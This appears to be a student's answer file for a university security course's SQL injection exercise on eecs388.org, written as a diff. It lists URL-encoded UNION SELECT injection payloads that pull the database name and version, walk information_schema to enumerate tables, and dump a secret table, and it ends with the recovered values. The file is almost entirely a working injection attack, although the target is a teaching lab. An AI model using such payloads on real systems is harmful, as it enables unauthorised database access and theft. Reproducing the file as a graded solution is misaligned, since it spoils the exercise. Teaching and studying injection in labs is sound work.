@@ -1,0 +1,14 @@
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+1%2Cdatabase%28%29%2C%40%40version%29%3B%23
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+table_schema%2C+table_name%2C+column_name+FROM+information_schema.columns+LIMIT+1+OFFSET+480%29%3B%23
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+table_schema%2C+table_name%2C+column_name+FROM+information_schema.columns+LIMIT+1+OFFSET+481%29%3B%23
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+table_schema%2C+table_name%2C+column_name+FROM+information_schema.columns+LIMIT+1+OFFSET+482%29%3B%23
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+table_schema%2C+table_name%2C+column_name+FROM+information_schema.columns+LIMIT+1+OFFSET+483%29%3B%23
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+table_schema%2C+table_name%2C+column_name+FROM+information_schema.columns+LIMIT+1+OFFSET+484%29%3B%23
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+table_schema%2C+table_name%2C+column_name+FROM+information_schema.columns+LIMIT+1+OFFSET+485%29%3B%23
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+table_schema%2C+table_name%2C+column_name+FROM+information_schema.columns+LIMIT+1+OFFSET+486%29%3B%23
+https://eecs388.org/project2/sqlinject3/?id=3%27+UNION+ALL+%28SELECT+1%2C+id%2C+secret+FROM+SECRETTABLE%29%3B%23
+
+Name: proj2_xtra_cr3dit
+Version: 5.5.57-0ubuntu0.14.04.1
+Tables: SECRETTABLE, foo, inject3_users
+Secret: hunter2
